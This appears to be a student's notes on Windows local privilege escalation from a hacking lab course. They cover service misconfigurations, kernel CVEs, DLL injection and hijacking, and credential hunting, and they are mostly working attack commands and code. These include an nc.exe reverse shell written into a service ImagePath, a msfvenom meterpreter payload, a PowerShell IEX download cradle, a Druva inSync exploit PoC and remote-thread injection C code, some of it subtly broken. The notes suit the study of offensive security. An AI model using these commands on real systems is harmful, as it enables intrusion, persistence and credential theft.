        RW BUILTIN\Administrators
                SERVICE_ALL_ACCESS
        RW NT AUTHORITY\Authenticated Users
                SERVICE_ALL_ACCESS


        
        -Check Local Admin Group

        C:\> net localgroup administrators


        -Changing the Service Binary Path

        C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

        -Stopping Service

        C:\> sc stop WindscribeService

        -Starting the Service

        C:\> sc start WindscribeService

        Another notable example is the Windows Update Orchestrator Service (UsoSvc), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful NT AUTHORITY\SYSTEM account. Before installing the security patch relating to CVE-2019-1322, it was possible to elevate privileges from a service account to SYSTEM. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.


        -Weak Service Permissions - Cleanup

        -Reverting the Binary Path

        C:\> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

        -Starting the Service Again

        C:\> sc start WindScribeService




        -Unquoted Service Path

        When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.


        Service Binary Path

        C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

        Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

        C:\Program Files (x86)\System Explorer\service\SystemExplorerService64

        -Querying Service

        C:\> sc qc SystemExplorerHelpService

        If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM.

                C:\Program.exe\
                C:\Program Files (x86)\System.exe

        However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.

        -Searching for Unquoted Service Paths

        C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """




        -Permissive Registry ACLs

        It is also worth searching for weak service ACLs in the Windows Registry. We can do this using accesschk.

        -Checking for Weak Service ACLs in Registry

        C:\> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

        -Changing ImagePath with PowerShell

        PS C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"


        -Modifiable Registry Autorun Binary

        -Check Startup Programs

        We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

        PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl



        possible folders for startup binaries

        dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
        dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
        dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
        dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
        Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
        Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"









                ---Kernel Exploits


        (   https://msrc.microsoft.com/update-guide/vulnerability  )


        -Notable Vulnerabilities

        MS08-067 - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. 
        Windows Server 2000, 2003, and 2008 and Windows XP and Vista


        MS17-010 - Also known as EternalBlue is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the Shadow Brokers leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. 


        ALPC Task Scheduler 0-Day - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to .job files located in the C:\Windows\tasks directory. An attacker could leverage this to create a hard link to a file that the attacker controls.The exploit for this flaw used the SchRpcSetSecurity API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service.
        (  https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html  )



        CVE-2021-36934 HiveNightmare, aka SeriousSam is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. 

        (  https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5  )

        mitigation  (  https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1 )




        -Checking Permissions on the SAM File

        We can check for this vulnerability using icacls to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the BUILTIN\Users group.

        C:\> icacls c:\Windows\System32\config\SAM
        

        Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw


        -Performing Attack and Parsing Password Hashes

        
        PS C:\> .\CVE-2021-36934.exe



        CVE-2021-1675/CVE-2021-34527 PrintNightmare is a flaw in RpcAddPrinterDriver which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege SeLoadDriverPrivilege the ability to add drivers to a remote Print Spooler. 
        (  https://github.com/cube0x0/CVE-2021-1675  ) C#

        (  https://github.com/calebstewart/CVE-2021-1675  ) Ps1


        -Checking for Spooler Service

        PS C:\> ls \\localhost\pipe\spoolss

        -Adding Local Admin with PrintNightmare PowerShell PoC

        First start by bypassing the execution policy on the target host:

        PS C:\> Set-ExecutionPolicy Bypass -Scope Process

        Now we can import the PowerShell script and use it to add a new local admin user.

        PS C:\> Import-Module .\CVE-2021-1675.ps1
        PS C:\> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

        PS C:\> net user hacker





                -Enumerating Missing Patches


        Examining Installed Updates

        PS C:\> systeminfo
        PS C:\> wmic qfe list brief  (  Viewing Installed Updates with WMI )
        PS C:\> Get-Hotfix

        We can search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for KB5000808 shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.

        (https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) Ms knowledge catalog


        -CVE-2020-0668 Example

        Next, let's exploit Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability, which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a .OLD extension when the service is triggered. This move operation is performed by NT AUTHORITY\SYSTEM, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

        -Checking Current User Privileges

        C:\> whoami /priv

        We can use this exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

        ( https://github.com/RedCursorSecurityConsulting/CVE-2020-0668 )

        At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as UsoDllLoader or DiagHub to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

        We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

            C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 


        -Checking Permissions on Binary

        C:\> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)


        Generating Malicious Binary

        $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe


        Downloading the binary

        For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

        We need to do this because running the exploit corrupts the malicious version of maintenanceservice.exe that is moved to (our copy in c:\Users\-student\Desktop that we are targeting) c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe which we will need to account for later. If we attempt to utilize the copied version, we will receive a system error 216 because the .exe file is no longer a valid binary. 

        PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe

        -Running

        C:\> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

        
        -Checking Permissions of New File

        C:\> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'


        -Replacing File with Malicious Binary



We can overwrite the maintenanceservice.exe binary in c:\Program Files (x86)\Mozilla Maintenance Service with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to C:\Users\-student\Desktop, maintenanceservice.exe and maintenanceservice2.exe. Let's move the good copy that was not corrupted by the exploit maintenanceservice2.exe to the Program Files directory, making sure to rename the file properly and remove the 2 or the service won't start. The copy command will only work from a cmd.exe window, not a PowerShell console.

        C:\> copy /Y C:\Users\-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
        
        
        -Exploit
        
        C:\> net start MozillaMaintenance 






                        //Vulnerable Services

        


        -Enumerating Installed Programs

        C:\> wmic product get name

        -Enumerating Local Ports


        C:\> netstat -ano | findstr 6064

        -Enumerating Process ID

        PS C:\> get-process -Id 3324

        -Enumerating Running Service

        PS C:\> get-service | ? {$_.DisplayName -like 'Druva*'}



        -Druva inSync Windows Client Local Privilege Escalation Example


        $ErrorActionPreference = "Stop"

        $cmd = "net user pwnd /add"

        $s = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp
        )
        $s.Connect("127.0.0.1", 6064)

        $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
        $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
        $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
        $length = [System.BitConverter]::GetBytes($command.Length);

        $s.Send($header)
        $s.Send($rpcType)
        $s.Send($length)
        $s.Send($command)


        For our purposes, we want to modify the $cmd variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with Invoke-PowerShellTcp.ps1. Download the script to our attack box, and rename it something simple like shell.ps1. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):
        (  https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  )

        Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

        Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

        $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.50:8080/shell.ps1')"

        Finally, start a Netcat listener on the attack box and execute the PoC PowerShell script on the target host (after modifying the PowerShell execution policy with a command such as Set-ExecutionPolicy Bypass -Scope Process).

        $ nc -lvnp 9443





                        //DLL Injection


        DLL injection is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

        DLL injection finds legitimate applications in various areas. For instance, software developers leverage this technology for hot patching, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. 


        -LoadLibrary

        LoadLibrary is a widely utilized method for DLL injection, employing the LoadLibrary API to load the DLL into the target process's address space.

        The LoadLibrary API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

       
       
        #include <windows.h>
        #include <stdio.h>

        int main() {
        // Using LoadLibrary to load a DLL into the current process
        HMODULE hModule = LoadLibrary("example.dll");
        if (hModule == NULL) {
                printf("Failed to load example.dll\n");
                return -1;
        }
        printf("Successfully loaded example.dll\n");

        return 0;
        }







        #include <windows.h>
        #include <stdio.h>

        int main() {
        // Using LoadLibrary for DLL injection
        // First, we need to get a handle to the target process
        DWORD targetProcessId = 123456 // The ID of the target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
        if (hProcess == NULL) {
                printf("Failed to open target process\n");
                return -1;
        }

        // Next, we need to allocate memory in the target process for the DLL path
        LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (dllPathAddressInRemoteMemory == NULL) {
                printf("Failed to allocate memory in target process\n");
                return -1;
        }

        // Write the DLL path to the allocated memory in the target process
        BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
        if (!succeededWriting) {
                printf("Failed to write DLL path to target process\n");
                return -1;
        }

        // Get the address of LoadLibrary in kernel32.dll
        LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        if (loadLibraryAddress == NULL) {
                printf("Failed to get address of LoadLibraryA\n");
                return -1;
        }

        // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
        if (hThread == NULL) {
                printf("Failed to create remote thread in target process\n");
                return -1;
        }

        printf("Successfully injected example.dll into target process\n");

        return 0;
        }



        
      HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess,
        [in] BOOL  bInheritHandle,
        [in] DWORD dwProcessId
        );




        [in] dwDesiredAccess

        The access to the process object. This access right is checked against the security descriptor for the process. This parameter can be one or more of the process access rights.

        If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.

        
        [in] bInheritHandle

        If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.


        [in] dwProcessId

        The identifier of the local process to be opened.


        Return value

        If the function succeeds, the return value is an open handle to the specified process.
        If the function fails, the return value is NULL.





        LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
        );




                [in] hProcess

                The handle to a process. The function allocates memory within the virtual address space of this process.The handle must have the PROCESS_VM_OPERATION access right.

                [in, optional] lpAddress

                The pointer that specifies a desired starting address for the region of pages that you want to allocate.

                If you are reserving memory, the function rounds this address down to the nearest multiple of the allocation granularity.
                If lpAddress is NULL, the function determines where to allocate the region.

                [in] dwSize

                The size of the region of memory to allocate, in bytes.


                [in] flAllocationType


                MEM_COMMIT
                0x00001000

                MEM_RESERVE
                0x00002000


                MEM_RESET
                0x00080000


                MEM_RESET_UNDO
                0x1000000


                MEM_LARGE_PAGES
                0x20000000


                MEM_PHYSICAL
                0x00400000


                MEM_TOP_DOWN
                0x00100000

                
                
                [in] flProtect

The memory protection for the region of pages to be allocated. If the pages are being committed, you can specify any one of the memory protection constants.


        Return value

If the function succeeds, the return value is the base address of the allocated region of pages.




                BOOL WriteProcessMemory(
                [in]  HANDLE  hProcess,
                [in]  LPVOID  lpBaseAddress,
                [in]  LPCVOID lpBuffer,
                [in]  SIZE_T  nSize,
                [out] SIZE_T  *lpNumberOfBytesWritten
                );


        [in] lpBaseAddress

        A pointer to the base address in the specified process to which data is written. Before data transfer occurs, the system verifies that all data in the base address and memory of the specified size is accessible for write access, and if it is not accessible, the function fails.

        [in] lpBuffer

A pointer to the buffer that contains data to be written in the address space of the specified process.

        [in] nSize

The number of bytes to be written to the specified process.

        [out] lpNumberOfBytesWritten

A pointer to a variable that receives the number of bytes transferred into the specified process. This parameter is optional. If lpNumberOfBytesWritten is NULL, the parameter is ignored.

        Return value

If the function succeeds, the return value is nonzero.






                -Manual Mapping

        Manual Mapping is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the LoadLibrary function, whose usage is monitored by security and anti-cheat systems.

        A simplified outline of the process can be represented as follows:

        Load the DLL as raw data into the injecting process.
       
        Map the DLL sections into the targeted process.
       
        Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.



                -Reflective DLL Injection

        (https://github.com/stephenfewer/ReflectiveDLLInjection  )


        "The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

        Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.



 1   Execution control is transferred to the library's ReflectiveLoader function, an exported function found in the library's export table. This can happen either via CreateRemoteThread() or a minimal bootstrap shellcode.
 
 2   As the library's image currently resides in an arbitrary memory location, the ReflectiveLoader initially calculates its own image's current memory location to parse its own headers for later use.
 
 3   The ReflectiveLoader then parses the host process's kernel32.dll export table to calculate the addresses of three functions needed by the loader, namely LoadLibraryA, GetProcAddress, and VirtualAlloc.
 
 4   The ReflectiveLoader now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
 
 5   The library's headers and sections are loaded into their new memory locations.
 
 6   The ReflectiveLoader then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
 
 7   The ReflectiveLoader then processes the newly loaded copy of its image's relocation table.
 
 8   The ReflectiveLoader then calls its newly loaded image's entry point function, DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully loaded into memory.
 
 9   Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode that called it, or if it were called via CreateRemoteThread, the thread would terminate."




                -DLL Hijacking


        DLL Hijacking is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

        The default DLL search order used by the system depends on whether Safe DLL Search Mode is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.


        Press Windows key + R to open the Run dialog box.
        
        Type in Regedit and press Enter. This will open the Registry Editor.
        
        Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager.
        
        In the right pane, look for the SafeDllSearchMode value. If it does not exist, right-click the blank space of the folder or right-click the Session Manager folder, select New and then DWORD (32-bit) Value. Name this new value as SafeDllSearchMode.
        
        Double-click SafeDllSearchMode. In the Value data field, enter 1 to enable and 0 to disable Safe DLL Search Mode.
        
        Click OK, close the Registry Editor and Reboot the system for the changes to take effect.



        With this mode enabled, applications search for necessary DLL files in the following sequence:

              1  The directory from which the application is loaded.
              2  The system directory.
              3  The 16-bit system directory.
              4  The Windows directory.
              5  The current directory.
              6  The directories that are listed in the PATH environment variable.


        However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

              1  The directory from which the application is loaded.
              2  The current directory.
              3  The system directory.
              4  The 16-bit system directory.
              5  The Windows directory
              6  The directories that are listed in the PATH environment variable


        DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

        Process Explorer: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
        
        PE Explorer: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

        After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.






        #include <stdio.h>
        #include <stdlib.h>
        #include <stdbool.h>
        #include <windows.h>

        typedef int (*AddFunc)(int, int);

        int readIntegerInput()
        {
        int value;
        char input[100];
        bool isValid = false;

        while (!isValid)
        {
                fgets(input, sizeof(input), stdin);

                if (sscanf(input, "%d", &value) == 1)
                {
                isValid = true;
                }
                else
                {
                printf("Invalid input. Please enter an integer: ");
                }
        }

        return value;
        }

        int main()
        {
        HMODULE hLibrary = LoadLibrary("library.dll");
        if (hLibrary == NULL)
        {
                printf("Failed to load library.dll\n");
                return 1;
        }

        AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
        if (add == NULL)
        {
                printf("Failed to locate the 'Add' function\n");
                FreeLibrary(hLibrary);
                return 1;
        }
        HMODULE hLibrary = LoadLibrary("x.dll");

        printf("Enter the first number: ");
        int a = readIntegerInput();

        printf("Enter the second number: ");
        int b = readIntegerInput();

        int result = add(a, b);
        printf("The sum of %d and %d is %d\n", a, b, result);

        FreeLibrary(hLibrary);
        system("pause");
        return 0;
        }

        It loads an add function from the library.dll and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the library.dll located in the same directory.

        First, let's set up a filter in procmon to solely include main.exe, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of main.exe. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close main.exe and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.


        We can further filter for an Operation of Load Image to only get the libraries the app is loading.



        -Proxying


        Create a new library: We will create a new library serving as the proxy for library.dll. This library will contain the necessary code to load the Add function from library.dll and perform the required tampering.
        
        Load the Add function: Within the new library, we will load the Add function from the original library.dll. This will allow us to access the original function.
        
        Tamper with the function: Once the Add function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add + 1 to the result.
        
        Return the modified function: After completing the tampering process, we will return the modified Add function from the new library back to main.exe. This will ensure that when main.exe calls the Add function, it will execute the modified version with the intended changes.




        // tamper.c
        #include <stdio.h>
        #include <Windows.h>

        #ifdef _WIN32
        #define DLL_EXPORT __declspec(dllexport)
        #else
        #define DLL_EXPORT
        #endif

        typedef int (*AddFunc)(int, int);

        DLL_EXPORT int Add(int a, int b)
        {
        // Load the original library containing the Add function
        HMODULE originalLibrary = LoadLibraryA("library.o.dll");
        if (originalLibrary != NULL)
        {
                // Get the address of the original Add function from the library
                AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
                if (originalAdd != NULL)
                {
                printf("============ HIJACKED ============\n");
                // Call the original Add function with the provided arguments
                int result = originalAdd(a, b);
                // Tamper with the result by adding +1
                printf("= Adding 1 to the sum to be evil\n");
                result += 1;
                printf("============ RETURN ============\n");
                // Return the tampered result
                return result;
                }
        }
        // Return -1 if the original library or function cannot be loaded
        return -1;
        }



        Either compile it or use the precompiled version provided. Rename library.dll to library.o.dll, and rename tamper.dll to library.dll.

Running main.exe then shows the successful hack.



                -Invalid Libraries

        Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in .dll and has a status of NAME NOT FOUND we can find such libraries in main.exe.

        #include <stdio.h>
        #include <Windows.h>

        BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
        {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
                printf("Hijacked... Oops...\n");
        }
        break;
        case DLL_PROCESS_DETACH:
                break;
        case DLL_THREAD_ATTACH:
                break;
        case DLL_THREAD_DETACH:
                break;
        }
        return TRUE;
        }







                       //Credential Hunting
                       
        
        -Application Configuration Files


        -Searching for Files

        We can use the findstr utility to search for sensitive information.

        PS C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml



        -Dictionary Files

        -Chrome Dictionary Files

        PS C:\> gc 'C:\Users\-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password




        -Unattended Installation Files

        Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.



        -PowerShell History File

        Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:


        C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


        -Confirming PowerShell History Save Path

        PS C:\> (Get-PSReadLineOption).HistorySavePath

        -Reading PowerShell History File

        Once we know the file's location (the default path is above), we can attempt to read its contents using gc.

        PS C:\> gc (Get-PSReadLineOption).HistorySavePath

        We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.

        PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}


        -PowerShell Credentials

        PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.

        Take, for example, the following script Connect-VC.ps1, which a sysadmin has created to connect to a vCenter server easily.

        # Connect-VC.ps1
        # Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
        $encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
        $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
        Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString


        -Decrypting PowerShell Credentials

        If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from encrypted.xml. The example below assumes the former.

        PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
        PS C:\> $credential.GetNetworkCredential().username

        bob


        PS C:\> $credential.GetNetworkCredential().password

        Str0ng3ncryptedP@ss!




                --Other Files

        
        In an Active Directory environment, we can use a tool such as Snaffler to crawl network share drives for interesting file extensions such as .kdbx, .vmdk, .vdhx, .ppk, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic passwords.txt file.

        -Manually Searching the File System for Credentials

        (  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-a-file-with-a-certain-filename )

        C:\> cd c:\Users\-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

        -Search File Contents with PowerShell

        PS C:\> select-string -Path C:\Users\-student\Documents\*.txt -Pattern password

        -Search for File Extensions - Example 1

        C:\> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

        -Search for File Extensions - Example 2

        C:\> where /R C:\ *.config


        -Search for File Extensions Using PowerShell

        PS C:\> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


        -Sticky Notes Passwords

        This file is located at C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite and is always worth searching for and examining.

        We can copy the  plum.sqlite* files down to our system and open them with a tool such as DB Browser for SQLite and view the Text column in the Note table with the query select Text from Note;.


        -Viewing Sticky Notes Data Using PowerShell

        This can also be done with PowerShell using the PSSQLite module. First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the Note table and look for any interesting data. This can also be done from our attack machine after downloading the .sqlite file or remotely via WinRM.

        (  https://github.com/RamblingCookieMonster/PSSQLite  )


        PS C:\> Set-ExecutionPolicy Bypass -Scope Process

        PS C:\> cd .\PSSQLite\
        PS C:\> Import-Module .\PSSQLite.psd1
        PS C:\> $db = 'C:\Users\-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
        PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap



        -Strings to View DB File Contents

        $  strings plum.sqlite-wal


        -Other Files of Interest

        %SYSTEMDRIVE%\pagefile.sys
        %WINDIR%\debug\NetSetup.log
        %WINDIR%\repair\sam
        %WINDIR%\repair\system
        %WINDIR%\repair\software, %WINDIR%\repair\security
        %WINDIR%\iis6.log
        %WINDIR%\system32\config\AppEvent.Evt
        %WINDIR%\system32\config\SecEvent.Evt
        %WINDIR%\system32\config\default.sav
        %WINDIR%\system32\config\security.sav
        %WINDIR%\system32\config\software.sav
        %WINDIR%\system32\config\system.sav
        %WINDIR%\system32\CCM\logs\*.log
        %USERPROFILE%\ntuser.dat
        %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
        %WINDIR%\System32\drivers\etc\hosts
        C:\ProgramData\Configs\*
        C:\Program Files\Windows PowerShell\*



        

        -Cmdkey Saved Credentials

        -Listing Saved Credentials

        The cmdkey command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

